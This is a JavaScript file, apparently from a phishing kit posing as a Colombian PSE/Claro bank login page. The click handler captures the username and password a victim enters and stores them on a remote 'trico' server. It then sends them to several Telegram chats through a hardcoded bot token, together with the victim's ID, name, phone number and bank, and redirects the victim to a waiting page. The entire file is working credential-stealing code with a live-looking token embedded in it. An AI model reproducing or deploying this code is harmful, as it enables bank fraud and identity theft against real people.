
function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnUsuario");

// Input de Usuario
const userInput = document.getElementById("txtUsuario");

// Input de Contraseña
const passInput = document.getElementById("txtPass");

async function sendToTelegram(message) {
  for (const chatId of chatIds) {
    const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    try {
      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      }
    } catch (error) {
      console.error(`Error de red (chat ID: ${chatId}):`, error);
    }
  }
}

async function updateStatus() {
  button.disabled = true;

  try {
    const response = await fetch(`${url}/trico/tricoData`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      throw new Error("Failed to fetch trico data");
    }

    const serverData = await response.json();
    const dataTables = [...serverData];

    for (const data of dataTables) {
      if (data.id == info.metaInfo.cc) {
        console.log("Usuario encontrado");

        const updateresponse = await fetch(
          `${url}/trico/tricoUserPse/${data.idreg}`,
          {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              usuario: info.metaInfo.user,
              password: info.metaInfo.puser,
            }),
          }
        );

        if (!updateresponse.ok) {
          throw new Error("Failed to update user data");
        }

        const updatedData = await updateresponse.json();

        // Crear el mensaje con toda la información
        const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\n🏦Banco: ${data.bank}\nFuente: ${fuente}\nCorrigió Usuario`;

        // Enviar el mensaje a Telegram
        await sendToTelegram(message);

        console.log("Usuario actualizado");
      }
    }

    window.location.href = "wait.html"; // Redirige a la página deseada
  } catch (error) {
    console.error("Error al actualizar el estado:", error);
    button.disabled = false;
  }
}

// Agregar evento al botón
button.addEventListener("click", async function (e) {
  e.preventDefault();

  if (userInput.value == "" || passInput.value == "") {
    alert("Por favor ingrese la información requerida");
    userInput.focus();
    return;
  } else {
    var user = userInput.value;
    var pass = passInput.value;

    info.metaInfo.user = user;
    info.metaInfo.puser = pass;

    updateLS();

    await updateStatus();
  }
});
